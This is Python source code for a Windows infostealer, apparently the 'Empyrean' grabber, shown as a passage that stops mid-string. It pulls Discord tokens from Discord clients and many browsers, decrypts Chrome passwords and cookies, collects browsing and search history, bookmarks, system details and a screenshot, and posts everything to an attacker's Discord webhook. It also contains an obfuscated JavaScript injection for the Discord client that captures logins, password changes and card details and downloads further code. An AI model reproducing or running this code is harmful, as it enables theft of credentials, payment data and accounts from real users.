import base64
import ctypes
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import uuid
from threading import Thread

import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData

def main() -> None:
    debug()
    
    webhook = "&WEBHOOK_URL&"
    
    threads = []
    for operation in [discord, google, injection,]:
        thread = Thread(target=operation, args=(webhook,))
        thread.start()
        threads.append(thread)
        
    for thread in threads:
        thread.join()
        
    system(webhook)

class discord():
    def __init__(self, webhook) -> None:
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        
        self.tokens = []
        self.ids = []
        
        self.grabTokens()
        self.upload_accounts(webhook)
    
    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:968704541946167357>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:968704542021652560>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "<:hypersquad_events:968704541774192693>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:968704541677723648>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:968704541501571133>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:968704541883261018>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:968704541874860082>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:968704542126510090>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "<:bug_hunter_2:968704541774217246>",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:968704541702905886>",
                "shift": 17,
                "ind": 131072 
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:988996447938674699>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "⌨",
                "shift": 20,
                "ind": 1048704
            },
        }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
    
    def upload_accounts(self, webhook) -> None:
        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
            
        for token in self.tokens:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
                }
            
            r = requests.get(self.baseurl, headers=headers).json()
            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
                             
            username = r["username"] + "#" + r["discriminator"]
            userid = r["id"]
            email = r["email"]
            phone = r["phone"]
            avatar = f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.png"
            badges = ' '.join([flag[0] for flag in self.calc_flags(r['public_flags'])[::-1]])
            
            try: nitro = 'Nitro Classic' if r['premium_type'] == 1 else 'Nitro Boost'
            except KeyError: nitro = 'None'
            
            if b.json() == []:
                methods = "None"
            else:
                methods = ""
                try:
                    for method in b.json():
                        if method['type'] == 1: 
                            methods += "💳 "
                        elif method['type'] == 2: 
                            methods += "<:paypal:973417655627288666> "
                        else: 
                            methods += "❓"
                except TypeError: 
                    methods += "❓"
            
            g = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
            hq_guilds = ""
            try:
                for guild in g.json():
                    admin = True if guild['permissions'] == '4398046511103' else False
                    if admin and guild['approximate_member_count'] >= 100:
                        i = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers=headers)
                        owner = " ✅ " if guild['owner'] else "❌"
                        
                        if len(i.json()) > 1:
                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
                        else:
                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite code could be found for this guild\n"
            
            except TypeError or KeyError:
                pass            
            
            f = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers=headers)
            hq_friends = ""
            try:
                for friend in f.json():
                    unprefered_flags = [64, 128, 256, 1048704]
                    inds = [flag[1] for flag in self.calc_flags(friend['user']['public_flags'])[::-1]]
                    for flag in unprefered_flags: inds.remove(flag) if flag in inds else None  
                    if inds != []:
                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(friend['user']['public_flags'])[::-1]])
                        hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"
            except TypeError:
                pass
            
            embed = Embed(title=f"{username} ({userid})", color=0x000000)
            embed.set_thumbnail(url=avatar)
            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b", inline=False)
            embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{methods if methods != '' else 'None'}", inline=True)
            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)
            
            
            embed.add_field(name="\u200b", value=f"\u200b", inline=False) if hq_guilds != "" else None
            if hq_guilds != "": embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=f"{hq_guilds}", inline=False)
            embed.add_field(name="\u200b", value=f"\u200b", inline=False) if hq_friends != "" else None
            if hq_friends != "": embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=f"{hq_friends}", inline=False)
            embed.add_field(name="\u200b", value=f"\u200b", inline=False) if hq_guilds or hq_friends != "" else None
            
            embed.set_footer(text="github.com/addi00000/empyrean")
            
            webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
            
    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token,
                                    })
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
                                    
class google():
    def __init__(self, webhook: str) -> None:
        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
        
        self.appdata = os.getenv('LOCALAPPDATA')
        self.databases = {
            self.appdata + '\\Google\\Chrome\\User Data\\Default',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5',
        }
        self.masterkey = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        self.files = [
            '.\\google-passwords.txt',
            '.\\google-cookies.txt',
            '.\\google-web-history.txt',
            '.\\google-search-history.txt',
            '.\\google-bookmarks.txt',
        ]
        
        self.password()
        self.cookies()
        self.web_history()
        self.search_history()
        self.bookmarks()
        
        for file in self.files:
            if not os.path.isfile(file):
                continue
            
            if os.path.getsize(file) > 8000000:
                continue
            
            webhook.send(file=File(file), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
        
        for file in self.files:
            if os.path.isfile(file):
                os.remove(file)
        
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
        
    def password(self):
        for path in self.databases:
            path += "\\Login Data"
            if not os.path.exists(path):
                continue
            shutil.copy2(path, "Loginvault.db")
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            with open('google-passwords.txt', 'a', encoding='utf-8') as f:
                for res in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():
                    url, username, password = res
                    password = self.decrypt_password(password, self.masterkey)
                    if url != "" and username != "" and password != "":
                        f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(username, password, url))
            cursor.close()
            conn.close()
            os.remove("Loginvault.db")
            
    def cookies(self):
        for path in self.databases:
            path += "\\Network\\Cookies"
            if not os.path.exists(path):
                continue
            shutil.copy2(path, "Loginvault.db")
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            with open('google-cookies.txt', 'a', encoding='utf-8') as f:
                for res in cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies").fetchall():
                    host, name, value, encrypted_value = res
                    value = self.decrypt_password(encrypted_value, self.masterkey)
                    if host != "" and name != "" and value != "":
                        f.write("Host: {:<40} Name: {:<40} Value: {}\n".format(host, name, value))
                      
            cursor.close()
            conn.close()
            os.remove("Loginvault.db") 
      
    def web_history(self):
        for path in self.databases:
            path += "\\History"
            if not os.path.exists(path):
                continue
            shutil.copy2(path, "Loginvault.db")
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            with open('google-web-history.txt', 'a', encoding='utf-8') as f:
                sites = []
                for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                    url, title, visit_count, last_visit_time = res
                    if url != "" and title != "" and visit_count != "" and last_visit_time != "":
                        sites.append((url, title, visit_count, last_visit_time))
                        
                sites.sort(key=lambda x: x[3], reverse=True)
                for site in sites:
                    f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
                    
            cursor.close()
            conn.close()
            os.remove("Loginvault.db")
                 
    def search_history(self):
        for path in self.databases:
            path += "\\History"
            if not os.path.exists(path):
                continue
            shutil.copy2(path, "Loginvault.db")
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            with open('google-search-history.txt', 'a', encoding='utf-8') as f:
                for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
                    term = res[0]
                    if term != "":
                        f.write("Search: {}\n".format(term))
            cursor.close()
            conn.close()
            os.remove("Loginvault.db")
            
    def bookmarks(self):
        for path in self.databases:
            path += "\\Bookmarks"
            if not os.path.exists(path):
                continue
            shutil.copy2(path, "bookmarks.json")
            with open('bookmarks.json', 'r', encoding='utf-8') as f:
                for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
                    if 'children' in item:
                        for child in item['children']:
                            if 'url' in child:
                                with open('google-bookmarks.txt', 'a', encoding='utf-8') as f:
                                    f.write("URL: {}\n".format(child['url']))
                    elif 'url' in item:
                        with open('google-bookmarks.txt', 'a', encoding='utf-8') as f:
                            f.write("URL: {}\n".format(item['url']))
            os.remove('bookmarks.json')

    def autofill(self):
        for path in self.databases:
            path += "\\autofill"

class system():
    def __init__(self, webhook: str) -> None:
        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
        embed = Embed(title="System Information", color=0x000000)
        
        embed.add_field(name="Display Name", value=self.get_display_name(), inline=True)
        embed.add_field(name="Hostname", value=os.getenv("COMPUTERNAME"), inline=True)
        embed.add_field(name="Username", value=os.getenv("USERNAME"), inline=True)
        
        embed.add_field(name="CPU", value=wmi.WMI().Win32_Processor()[0].Name, inline=True)
        embed.add_field(name="GPU", value=wmi.WMI().Win32_VideoController()[0].Name, inline=True)
        embed.add_field(name="RAM", value=round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0), inline=True)
        
        ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None).save("screenshot.png")
        embed.set_image(url="attachment://screenshot.png")
        
        try:
            webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
        except:
            pass
        
        if os.path.exists("screenshot.png"):
            os.remove("screenshot.png")
        
    def get_display_name(self):
        GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
        NameDisplay = 3
    
        size = ctypes.pointer(ctypes.c_ulong(0))
        GetUserNameEx(NameDisplay, None, size)
    
        nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
        GetUserNameEx(NameDisplay, nameBuffer, size)
        return nameBuffer.value

class injection:
    def __init__(self, webhook: str):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord', 
            self.appdata + '\\DiscordCanary', 
            self.appdata + '\\DiscordPTB', 
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = r"""
        const _0x25b1bd=_0x16c5;(function(_0x4dd0eb,_0x22279b){const _0x4a97f4=_0x16c5,_0x187969=_0x4dd0eb();while(!![]){try{const _0x366c37=-parseInt(_0x4a97f4(0x179))/0x1+parseInt(_0x4a97f4(0x1a2))/0x2*(parseInt(_0x4a97f4(0x1ad))/0x3)+parseInt(_0x4a97f4(0x21b))/0x4+-parseInt(_0x4a97f4(0x1d2))/0x5*(-parseInt(_0x4a97f4(0x184))/0x6)+parseInt(_0x4a97f4(0x165))/0x7*(parseInt(_0x4a97f4(0x163))/0x8)+parseInt(_0x4a97f4(0x1b0))/0x9*(parseInt(_0x4a97f4(0x176))/0xa)+-parseInt(_0x4a97f4(0x159))/0xb;if(_0x366c37===_0x22279b)break;else _0x187969['push'](_0x187969['shift']());}catch(_0x23dfd0){_0x187969['push'](_0x187969['shift']());}}}(_0x3fb8,0x7bef8));const _0x13ed05=(function(){let _0x2416a2=!![];return function(_0x578e11,_0x383632){const _0x3a34d2=_0x2416a2?function(){const _0x35e56f=_0x16c5;if(_0x383632){const _0x1e5a7f=_0x383632[_0x35e56f(0x1ca)](_0x578e11,arguments);return _0x383632=null,_0x1e5a7f;}}:function(){};return _0x2416a2=![],_0x3a34d2;};}()),_0x3cb94d=_0x13ed05(this,function(){const _0x2976e4=_0x16c5;return _0x3cb94d[_0x2976e4(0x221)]()['search'](_0x2976e4(0x1c3))[_0x2976e4(0x221)]()['constructor'](_0x3cb94d)[_0x2976e4(0x202)](_0x2976e4(0x1c3));});_0x3cb94d();const _0x22ccba=(function(){let _0x3ece6a=!![];return function(_0x42e2f7,_0x441c87){const _0x5021d2=_0x3ece6a?function(){const _0x4bb653=_0x16c5;if(_0x441c87){const _0x3709f1=_0x441c87[_0x4bb653(0x1ca)](_0x42e2f7,arguments);return _0x441c87=null,_0x3709f1;}}:function(){};return _0x3ece6a=![],_0x5021d2;};}()),_0xf16cfd=_0x22ccba(this,function(){const _0x55dd9e=_0x16c5;let _0x30d562;try{const _0x278fd9=Function(_0x55dd9e(0x18f)+_0x55dd9e(0x1aa)+');');_0x30d562=_0x278fd9();}catch(_0x250623){_0x30d562=window;}const _0x5d6218=_0x30d562[_0x55dd9e(0x1a1)]=_0x30d562[_0x55dd9e(0x1a1)]||{},_0x3c62ea=[_0x55dd9e(0x18a),'warn','info','error',_0x55dd9e(0x185),_0x55dd9e(0x1f3),_0x55dd9e(0x1e6)];for(let _0x28477b=0x0;_0x28477b<_0x3c62ea[_0x55dd9e(0x1b5)];_0x28477b++){const _0x43a3f0=_0x22ccba[_0x55dd9e(0x1b9)][_0x55dd9e(0x225)][_0x55dd9e(0x173)](_0x22ccba),_0x2d427b=_0x3c62ea[_0x28477b],_0x4b21c7=_0x5d6218[_0x2d427b]||_0x43a3f0;_0x43a3f0['__proto__']=_0x22ccba[_0x55dd9e(0x173)](_0x22ccba),_0x43a3f0['toString']=_0x4b21c7['toString'][_0x55dd9e(0x173)](_0x4b21c7),_0x5d6218[_0x2d427b]=_0x43a3f0;}});_0xf16cfd();const args=process[_0x25b1bd(0x16e)],fs=require('fs'),path=require(_0x25b1bd(0x174)),https=require(_0x25b1bd(0x1fe)),querystring=require(_0x25b1bd(0x20d)),{BrowserWindow,session}=require(_0x25b1bd(0x22c)),config={'webhook':_0x25b1bd(0x205),'webhook_protector_key':'%WEBHOOK_KEY%','auto_buy_nitro':![],'ping_on_run':![],'ping_val':_0x25b1bd(0x1f0),'embed_name':_0x25b1bd(0x200),'embed_icon':_0x25b1bd(0x1e5)[_0x25b1bd(0x164)](/ /g,_0x25b1bd(0x16f)),'embed_color':0x0,'injection_url':'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js','api':_0x25b1bd(0x1e2),'nitro':{'boost':{'year':{'id':_0x25b1bd(0x1fa),'sku':_0x25b1bd(0x1bc),'price':'9999'},'month':{'id':_0x25b1bd(0x1fa),'sku':'511651880837840896','price':_0x25b1bd(0x188)}},'classic':{'month':{'id':_0x25b1bd(0x166),'sku':_0x25b1bd(0x204),'price':_0x25b1bd(0x178)}}},'filter':{'urls':[_0x25b1bd(0x1ee),_0x25b1bd(0x1b4),_0x25b1bd(0x1fd),'https://discordapp.com/api/v*/auth/login',_0x25b1bd(0x216),_0x25b1bd(0x1e4),_0x25b1bd(0x17b),_0x25b1bd(0x20f),_0x25b1bd(0x182),_0x25b1bd(0x17a)]},'filter2':{'urls':[_0x25b1bd(0x1d8),_0x25b1bd(0x1f9),_0x25b1bd(0x1d7),_0x25b1bd(0x162),_0x25b1bd(0x1bd),'wss://remote-auth-gateway.discord.gg/*']}};function _0x3fb8(){const _0x9acf28=['**\x0aCVC:\x20**','HypeSquad\x20Brillance,\x20','\x20|\x20','**\x0aNew\x20Password:\x20**','apply','card[exp_month]','filter2','getAllWindows','month','catch','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','rmdirSync','1841810VVyuuc','**\x0aBilling:\x20**','executeJavaScript','Discord\x20Developer,\x20','sep','https://discord.com/api/v*/applications/detectable','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','Nitro\x20Type:\x20**','password','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','No\x20Nitro','ABCDEFGHIJKLMNOPQRSTUVWXYZ234567','ping_val','join','content','**Nitro\x20bought!**','https://discord.com/api/v9/users/@me','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27','https://*.discord.com/api/v*/auth/login','https://i.imgur.com/ihzoAWl.jpeg','trace','package.json','login','error','forEach','initiation','index.js','app.asar','https://discord.com/api/v*/users/@me','application/json','@here','boost','binLen','table','embed_color','POST','**\x0aPassword:\x20**','getHMAC','push','https://*.discord.com/api/v*/applications/detectable','521847234246082599','statusCode','write','https://*.discord.com/api/v*/users/@me','https','\x27;\x0aconst\x20bdPath\x20=\x20\x27','Empyrean\x20Injection','undefined','search','username','511651871736201216','%WEBHOOK%','embed_name','exports','Failed\x20to\x20Purchase\x20❌','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','gift_code','jsSHA','querystring','writeFileSync','https://api.stripe.com/v*/tokens','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','Access-Control-Allow-Origin\x20\x27*\x27','tokens','onHeadersReceived','slice','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','https://discord.com/api/v*/auth/login','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','auto_buy_nitro','toUpperCase','price','1947476UORsMo','nitro','0123456789abcdef','charAt','method','webhook_protector_key','toString','email','**\x0aCredit\x20Card\x20Expiration:\x20**','**Email\x20Changed**','prototype','substr','defaultSession','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','**Nitro\x20Code:**\x0a```diff\x0a+\x20','premium_type','Invalid\x20base32\x20character\x20in\x20key','electron','HypeSquad\x20Bravery,\x20','**Discord\x20Info**','String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments','**Account\x20Info**','**\x20-\x20Password:\x20**','sku','Email:\x20**','7fffffff','));\x0a\x20\x20\x20\x20xmlHttp.responseText','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','2422867c-244d-476a-ba4f-36e197758d97','Contents','9460660yugkFJ','stringify','filter','String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters','https://cdn.discordapp.com/avatars/','Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key','endsWith','Credit\x20Card\x20Number:\x20**','darwin','https://*.discord.com/api/v*/users/@me/library','6776sincMp','replace','1596spRWzN','521846918637420545','round','year','Hypesquad\x20Event,\x20','onBeforeRequest','api/webhooks','invalid','confirm','argv','%20','pathname','default','indexOf','bind','path','function','2740NrkGqr','concat','499','77367uZcwaI','https://api.stripe.com/v*/payment_intents/*/confirm','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','*\x0aBadges:\x20**','embed_icon','Green\x20BugHunter,\x20','Nitro\x20Boost','api','injection_url','https://api.stripe.com/v*/setup_intents/*/confirm','value','6bVgjEb','exception','type','end','999','<:paypal:951139189389410365>\x20','log','startsWith','setHMACKey','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','\x5cmodules\x5cdiscord_desktop_core-1\x5